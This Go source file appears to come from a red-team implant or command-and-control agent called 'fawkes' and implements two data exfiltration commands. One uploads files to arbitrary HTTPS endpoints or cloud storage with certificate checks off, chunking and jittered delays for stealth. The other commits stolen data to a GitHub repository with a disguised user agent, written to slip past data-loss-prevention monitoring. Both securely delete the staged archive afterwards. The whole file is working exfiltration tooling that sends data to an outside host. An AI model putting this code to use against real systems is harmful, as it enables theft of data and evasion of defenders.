package commands

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// cloudExfilParams extends CompressParams with cloud-specific options.
type cloudExfilParams struct {
	URL       string            `json:"url"`        // Target HTTPS URL
	Method    string            `json:"method"`     // HTTP method (PUT or POST)
	Headers   map[string]string `json:"headers"`    // Custom headers (auth tokens, content type)
	ChunkSize int64             `json:"chunk_size"` // Bytes per chunk (0 = single upload)
	Delay     int               `json:"delay"`      // Delay between chunks in milliseconds
	Proxy     string            `json:"proxy"`      // Optional HTTP proxy
}

// compressExfilHTTPS uploads a file to an HTTPS endpoint. Works with:
// - S3 pre-signed PUT URLs
// - Azure Blob Storage SAS URLs
// - GCS signed URLs
// - Generic HTTPS receivers (webhook endpoints, custom servers)
// MITRE ATT&CK: T1567 (Exfiltration Over Web Service)
func compressExfilHTTPS(task structs.Task, params CompressParams) structs.CommandResult {
	if params.Path == "" {
		return errorResult("Error: 'path' is required (file to exfiltrate)")
	}

	// Parse cloud-specific params from the output field (JSON string)
	var cloud cloudExfilParams
	if params.Output != "" {
		if err := json.Unmarshal([]byte(params.Output), &cloud); err != nil {
			return errorf("Error parsing cloud params from 'output' field: %v\nExpected JSON: {\"url\":\"...\",\"method\":\"PUT\",\"headers\":{},\"chunk_size\":0,\"delay\":0}", err)
		}
	}

	if cloud.URL == "" {
		return errorResult("Error: 'url' is required in cloud params. Set output to JSON: {\"url\":\"https://...\"}")
	}

	if !strings.HasPrefix(cloud.URL, "https://") {
		return errorResult("Error: URL must use HTTPS for exfiltration")
	}

	if cloud.Method == "" {
		cloud.Method = "PUT"
	}
	cloud.Method = strings.ToUpper(cloud.Method)
	if cloud.Method != "PUT" && cloud.Method != "POST" {
		return errorf("Error: method must be PUT or POST (got %s)", cloud.Method)
	}

	archivePath, err := filepath.Abs(params.Path)
	if err != nil {
		return errorf("Error resolving path: %v", err)
	}

	info, err := os.Stat(archivePath)
	if err != nil {
		return errorf("Error accessing file: %v", err)
	}
	fileSize := info.Size()

	// Hash the file for integrity
	fileHash, err := hashFileSHA256(archivePath)
	if err != nil {
		return errorf("Error hashing file: %v", err)
	}

	// Create HTTPS client
	client := &http.Client{
		Timeout: 5 * time.Minute,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // Red team: accept self-signed certs
			},
		},
	}

	var uploadedBytes int64
	var chunkCount int

	if cloud.ChunkSize > 0 && fileSize > cloud.ChunkSize {
		// Chunked upload
		uploadedBytes, chunkCount, err = chunkedUpload(task, client, cloud, archivePath, fileSize)
	} else {
		// Single upload
		uploadedBytes, err = singleUpload(task, client, cloud, archivePath, fileSize)
		chunkCount = 1
	}

	if err != nil {
		return errorf("Exfiltration failed: %v", err)
	}

	// Auto-cleanup if requested
	cleanedUp := false
	if params.Cleanup {
		secureRemove(archivePath)
		cleanedUp = true
	}

	result := httpsExfilResult{
		URL:          cloud.URL,
		Method:       cloud.Method,
		FileSize:     fileSize,
		Uploaded:     uploadedBytes,
		Chunks:       chunkCount,
		SHA256:       fileHash,
		CleanedUp:    cleanedUp,
		ArchivePath:  archivePath,
		Status:       "transferred",
	}
	resultJSON, _ := json.Marshal(result)
	return successResult(string(resultJSON))
}

// httpsExfilResult holds the result of an HTTPS exfiltration operation.
type httpsExfilResult struct {
	URL         string `json:"url"`
	Method      string `json:"method"`
	FileSize    int64  `json:"file_size"`
	Uploaded    int64  `json:"uploaded"`
	Chunks      int    `json:"chunks"`
	SHA256      string `json:"sha256"`
	CleanedUp   bool   `json:"cleaned_up"`
	ArchivePath string `json:"archive_path"`
	Status      string `json:"status"`
}

func singleUpload(task structs.Task, client *http.Client, cloud cloudExfilParams, path string, size int64) (int64, error) {
	file, err := os.Open(path)
	if err != nil {
		return 0, fmt.Errorf("cannot open file: %w", err)
	}
	defer file.Close()

	req, err := http.NewRequest(cloud.Method, cloud.URL, file)
	if err != nil {
		return 0, fmt.Errorf("cannot create request: %w", err)
	}
	req.ContentLength = size

	// Apply custom headers
	for k, v := range cloud.Headers {
		req.Header.Set(k, v)
	}

	// Default content type if not set
	if req.Header.Get("Content-Type") == "" {
		req.Header.Set("Content-Type", "application/octet-stream")
	}

	resp, err := client.Do(req)
	if err != nil {
		return 0, fmt.Errorf("upload failed: %w", err)
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, resp.Body) // drain body

	if resp.StatusCode >= 400 {
		return 0, fmt.Errorf("server returned %d %s", resp.StatusCode, resp.Status)
	}

	return size, nil
}

func chunkedUpload(task structs.Task, client *http.Client, cloud cloudExfilParams, path string, size int64) (int64, int, error) {
	file, err := os.Open(path)
	if err != nil {
		return 0, 0, fmt.Errorf("cannot open file: %w", err)
	}
	defer file.Close()

	var totalUploaded int64
	chunkNum := 0
	buf := make([]byte, cloud.ChunkSize)

	for totalUploaded < size {
		if task.DidStop() {
			return totalUploaded, chunkNum, fmt.Errorf("cancelled after %d chunks", chunkNum)
		}

		n, readErr := file.Read(buf)
		if n == 0 && readErr != nil {
			break
		}

		chunkNum++

		// Build chunk URL — append chunk number as query param
		chunkURL := cloud.URL
		if strings.Contains(chunkURL, "?") {
			chunkURL += fmt.Sprintf("&chunk=%d", chunkNum)
		} else {
			chunkURL += fmt.Sprintf("?chunk=%d", chunkNum)
		}

		req, err := http.NewRequest(cloud.Method, chunkURL, bytes.NewReader(buf[:n]))
		if err != nil {
			return totalUploaded, chunkNum, fmt.Errorf("chunk %d request error: %w", chunkNum, err)
		}
		req.ContentLength = int64(n)

		for k, v := range cloud.Headers {
			req.Header.Set(k, v)
		}
		if req.Header.Get("Content-Type") == "" {
			req.Header.Set("Content-Type", "application/octet-stream")
		}
		req.Header.Set("X-Chunk-Number", fmt.Sprintf("%d", chunkNum))
		req.Header.Set("X-Total-Size", fmt.Sprintf("%d", size))

		resp, err := client.Do(req)
		if err != nil {
			return totalUploaded, chunkNum, fmt.Errorf("chunk %d upload failed: %w", chunkNum, err)
		}
		_, _ = io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		if resp.StatusCode >= 400 {
			return totalUploaded, chunkNum, fmt.Errorf("chunk %d: server returned %d", chunkNum, resp.StatusCode)
		}

		totalUploaded += int64(n)

		// Inter-chunk delay with jitter for OPSEC
		if cloud.Delay > 0 && totalUploaded < size {
			d := time.Duration(cloud.Delay) * time.Millisecond
			jitterSleep(d, d*2)
		}
	}

	return totalUploaded, chunkNum, nil
}

// compressExfilGitHub pushes data to a GitHub repository as file commits.
// Uses the GitHub Contents API to create/update files. Blends with normal
// developer activity and bypasses network-level DLP.
// MITRE ATT&CK: T1567.001 (Exfiltration to Code Repository)
func compressExfilGitHub(task structs.Task, params CompressParams) structs.CommandResult {
	if params.Path == "" {
		return errorResult("Error: 'path' is required (file to exfiltrate)")
	}

	// Parse GitHub params from output field
	var gh githubExfilParams
	if params.Output != "" {
		if err := json.Unmarshal([]byte(params.Output), &gh); err != nil {
			return errorf("Error parsing GitHub params: %v\nExpected: {\"token\":\"ghp_...\",\"repo\":\"owner/repo\",\"path\":\"data/file.dat\"}", err)
		}
	}

	if gh.Token == "" {
		return errorResult("Error: 'token' required (GitHub PAT with repo scope)")
	}
	if gh.Repo == "" {
		return errorResult("Error: 'repo' required (owner/repo format)")
	}
	if gh.FilePath == "" {
		gh.FilePath = fmt.Sprintf("data/%s.dat", randomStagingName())
	}

	archivePath, err := filepath.Abs(params.Path)
	if err != nil {
		return errorf("Error resolving path: %v", err)
	}

	data, err := os.ReadFile(archivePath)
	if err != nil {
		return errorf("Error reading file: %v", err)
	}

	fileHash := sha256Hex(data)

	// GitHub API: PUT /repos/{owner}/{repo}/contents/{path}
	apiURL := fmt.Sprintf("https://api.github.com/repos/%s/contents/%s", gh.Repo, gh.FilePath)

	// Base64 encode the content
	import64 := encodeBase64Std(data)

	message := gh.Message
	if message == "" {
		message = "Update data"
	}

	// Build request body
	reqBody := map[string]string{
		"message": message,
		"content": import64,
	}
	// If updating existing file, need the SHA
	if gh.SHA != "" {
		reqBody["sha"] = gh.SHA
	}
	bodyJSON, _ := json.Marshal(reqBody)

	req, err := http.NewRequest("PUT", apiURL, bytes.NewReader(bodyJSON))
	if err != nil {
		return errorf("Error creating request: %v", err)
	}
	req.Header.Set("Authorization", "Bearer "+gh.Token)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "git/2.45.0")

	client := &http.Client{Timeout: 5 * time.Minute}
	resp, err := client.Do(req)
	if err != nil {
		return errorf("GitHub API request failed: %v", err)
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)

	if resp.StatusCode >= 400 {
		return errorf("GitHub API error %d: %s", resp.StatusCode, string(respBody))
	}

	// Extract the SHA from response for potential updates
	var ghResp struct {
		Content struct {
			SHA string `json:"sha"`
		} `json:"content"`
	}
	_ = json.Unmarshal(respBody, &ghResp)

	// Zero the token from memory
	structs.ZeroString(&gh.Token)

	// Cleanup
	cleanedUp := false
	if params.Cleanup {
		secureRemove(archivePath)
		cleanedUp = true
	}

	result := githubExfilResult{
		Repo:      gh.Repo,
		FilePath:  gh.FilePath,
		FileSize:  int64(len(data)),
		SHA256:    fileHash,
		CommitSHA: ghResp.Content.SHA,
		CleanedUp: cleanedUp,
		Status:    "committed",
	}
	resultJSON, _ := json.Marshal(result)
	return successResult(string(resultJSON))
}

type githubExfilParams struct {
	Token    string `json:"token"`     // GitHub PAT
	Repo     string `json:"repo"`      // owner/repo
	FilePath string `json:"path"`      // File path in repo
	Message  string `json:"message"`   // Commit message
	SHA      string `json:"sha"`       // Existing file SHA (for updates)
}

type githubExfilResult struct {
	Repo      string `json:"repo"`
	FilePath  string `json:"file_path"`
	FileSize  int64  `json:"file_size"`
	SHA256    string `json:"sha256"`
	CommitSHA string `json:"commit_sha"`
	CleanedUp bool   `json:"cleaned_up"`
	Status    string `json:"status"`
}

// hashFileSHA256 computes SHA-256 of a file.
func hashFileSHA256(path string) (string, error) {
	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer f.Close()

	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", err
	}
	return hex.EncodeToString(h.Sum(nil)), nil
}

// sha256Hex computes SHA-256 hex digest of data.
func sha256Hex(data []byte) string {
	h := sha256.Sum256(data)
	return hex.EncodeToString(h[:])
}

// encodeBase64Std wraps standard base64 encoding.
func encodeBase64Std(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}
